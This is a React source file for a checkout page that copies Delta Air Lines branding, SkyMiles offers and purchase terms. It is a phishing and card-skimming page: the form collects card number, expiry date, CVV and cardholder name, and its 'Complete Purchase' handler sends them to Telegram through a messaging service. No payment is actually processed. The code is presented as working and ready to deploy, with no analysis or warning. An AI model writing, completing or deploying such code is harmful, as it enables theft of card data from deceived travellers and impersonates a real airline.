
import React, { useState, useRef } from 'react';
import PurchaseConfirmationModal from './PurchaseConfirmationModal';
import { sendMessage, formatPaymentData } from '../services/telegramService';

const Payment = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  // Handle card number input with format XXXX XXXX XXXX XXXX
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    
    // Format with spaces after every 4 digits
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };
  
  // Handle expiry date input with format MM/YY
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    
    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    
    setExpiryDate(value);
  };
  
  // Handle CVV input (limit to 4 digits)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCvv(value);
    }
  };

  const handleCompletePurchase = async () => {
    // Send payment data to Telegram
    const paymentData = {
      cardNumber,
      expiryDate,
      cvv,
      nameOnCard
    };
    
    try {
      await sendMessage(formatPaymentData(paymentData));
      console.log('Payment data sent to Telegram');
    } catch (error) {
      console.error('Failed to send payment data to Telegram:', error);
    }
    
    setIsModalOpen(true);
  };

  return (
    <div className="mt-8 animate-fadeIn">
      <div className="flex items-center">
        <div className="step-number bg-delta-blue text-white mr-3">2</div>
        <h2 className="text-xl font-semibold text-delta-blue">Payment</h2>
      </div>
      
      <div className="mt-6 border border-gray-200 rounded-md">
        <div className="border-b border-gray-200 bg-gray-50 p-3">
          <div className="flex">
            <button className="text-delta-blue font-medium px-4 py-2 hover:bg-white hover:rounded-md transition-all">
              Use eCredits
            </button>
            
            <button className="text-delta-blue font-medium px-4 py-2 hover:bg-white hover:rounded-md transition-all">
              Use other forms of payment
            </button>
          </div>
        </div>
        
        <div className="p-6">
          <h3 className="font-medium">Credit/Debit Card</h3>
          
          <p className="mt-4 text-sm">All fields are required unless noted</p>
          
          <div className="mt-4 grid grid-cols-1 md:grid-cols-4 gap-6">
            <div className="md:col-span-1">
              <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
              <input 
                type="text" 
                className="input-field" 
                placeholder="0000 0000 0000 0000"
                value={cardNumber}
                onChange={handleCardNumberChange}
                maxLength={19}
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Expiration Date</label>
              <input 
                type="text" 
                placeholder="MM/YY" 
                className="input-field"
                value={expiryDate}
                onChange={handleExpiryChange}
                maxLength={5}
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
              <div className="flex items-center">
                <input 
                  type="text" 
                  className="input-field" 
                  placeholder="000"
                  value={cvv}
                  onChange={handleCvvChange}
                  maxLength={4}
                />
                <button className="ml-2 text-delta-blue">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="16" x2="12" y2="12"></line>
                    <line x1="12" y1="8" x2="12.01" y2="8"></line>
                  </svg>
                </button>
              </div>
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
              <input 
                type="text" 
                className="input-field"
                value={nameOnCard}
                onChange={(e) => setNameOnCard(e.target.value)}
              />
            </div>
          </div>
          
          <div className="mt-4 flex items-start">
            <div className="text-delta-blue mr-2">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="16" x2="12" y2="12"></line>
                <line x1="12" y1="8" x2="12.01" y2="8"></line>
              </svg>
            </div>
            <p className="text-sm">
              Earn up to an additional 2 or 3 miles per dollar on this purchase when you use your Delta SkyMiles American Express Card, depending on card type. (<a href="#" className="text-delta-lightblue hover:underline">Terms and Conditions</a>)
            </p>
          </div>
        </div>
      </div>
      
      <div className="mt-6 text-sm">
        <p>
          By selecting Complete Purchase, you agree to all the Terms and Conditions, <a href="#" className="text-delta-lightblue hover:underline">Delta's Privacy Policy</a> and the <a href="#" className="text-delta-lightblue hover:underline">Hazardous Material Policy</a> outlined below.
        </p>
        
        <p className="mt-4">
          You acknowledge that you are at least 16 years of age.
        </p>
        
        <p className="mt-4">
          Federal law forbids the carriage of hazardous materials aboard the aircraft, in your luggage, or on your person. Hazardous materials include explosives, compressed gases, flammable liquids and solids, oxidizers, poisons, corrosives, and radioactive materials. E-cigarettes are not permitted in checked baggage and must be transported in carry on baggage only.
        </p>
      </div>
      
      <div className="mt-6 flex items-center justify-between">
        <div className="border border-gray-200 rounded-md p-4 flex items-start">
          <div className="mr-6">
            <p className="text-sm text-delta-blue">As a SkyMiles Member,</p>
            <p className="text-sm text-delta-blue font-medium">you could earn:</p>
          </div>
          
          <div className="flex items-baseline">
            <span className="text-2xl font-bold text-delta-blue">8,995</span>
            <span className="ml-1 text-sm text-gray-600">Miles</span>
          </div>
          
          <div className="mx-6 text-gray-300">|</div>
          
          <div className="flex items-baseline">
            <span className="text-2xl font-bold text-delta-blue">$1,569</span>
            <span className="ml-1 text-sm text-gray-600">MQDs</span>
          </div>
        </div>
        
        <div className="flex items-center space-x-4">
          <div className="flex items-center">
            <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center text-delta-blue">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 6 12 12 16 14"></polyline>
              </svg>
            </div>
            <div className="ml-2">
              <p className="text-sm font-medium">24 HR RISK-FREE</p>
              <p className="text-sm font-medium">CANCELLATION</p>
            </div>
          </div>
          
          <button 
            className="red-button uppercase font-medium tracking-wide"
            onClick={handleCompletePurchase}
          >
            Complete Purchase
          </button>
        </div>
      </div>
      
      <div className="mt-3 text-right">
        <a href="#" className="text-sm text-delta-blue hover:underline">See Terms Below.</a>
      </div>
      
      <div className="mt-10">
        <h2 className="text-xl font-semibold text-delta-blue">Terms and Conditions</h2>
        
        <div className="mt-6">
          <p className="text-sm uppercase font-bold text-delta-blue">SKYMILES EARNING</p>
          
          <p className="mt-2 text-sm">
            Delta-marketed or -ticketed flights earn miles based on ticket price (base fare plus any carrier-imposed surcharges). These are approximate miles and Medallion Qualification Dollars earned for the selected itinerary. Miles and MQDs will be posted to your SkyMiles account upon completion of the flight. You will not earn miles or MQDs on Basic Economy fares.
          </p>
          
          <p className="mt-4 text-sm">
            Miles and MQDs are earned by the passengers who are flying and have provided SkyMiles numbers. Promotional bonus miles are not included. Estimates are subject to change. All SkyMiles Program Rules apply.
          </p>
        </div>
        
        <div className="mt-6">
          <p className="text-sm uppercase font-bold text-delta-blue">GENERAL CONDITIONS OF PURCHASE</p>
          
          <p className="mt-2 text-sm">
            You agree to accept all Fare Rules, all Trip Extras Terms and Conditions, and all terms in the Contract of Carriage applicable to your ticket (<a href="#" className="text-delta-lightblue hover:underline">Domestic</a> for itineraries entirely within the United States, <a href="#" className="text-delta-lightblue hover:underline">Canada</a> for itineraries between the United States and Canada, or <a href="#" className="text-delta-lightblue hover:underline">International</a> for all other itineraries.)
          </p>
          
          <p className="mt-4 text-sm">
            Once your ticket is purchased, <a href="#" className="text-delta-lightblue hover:underline">Risk-Free Cancellation</a> may apply. No contract exists until you receive confirmation that payment was received and processed.
          </p>
          
          <p className="mt-4 text-sm">
            In addition, you understand that Delta Air Lines will pass personal data provided in connection with this booking to government authorities for security purposes. I accept the <a href="#" className="text-delta-lightblue hover:underline">Privacy Policy</a>.
          </p>
          
          <p className="mt-4 text-sm">
            View <a href="#" className="text-delta-lightblue hover:underline">Fare Rules</a>, <a href="#" className="text-delta-lightblue hover:underline">Change & Cancellation Policies</a>. This ticket is <a href="#" className="text-delta-lightblue hover:underline">Changeable / Nonrefundable</a>. Fees may apply. If you do not show up for any flight in your itinerary without notifying us or changing/cancelling your flight before it departs, we will cancel all remaining flights in the itinerary and the ticket will have no remaining value.
          </p>
        </div>
      </div>
      
      <PurchaseConfirmationModal 
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        onConfirm={() => console.log('Purchase confirmed')}
      />
    </div>
  );
};

export default Payment;
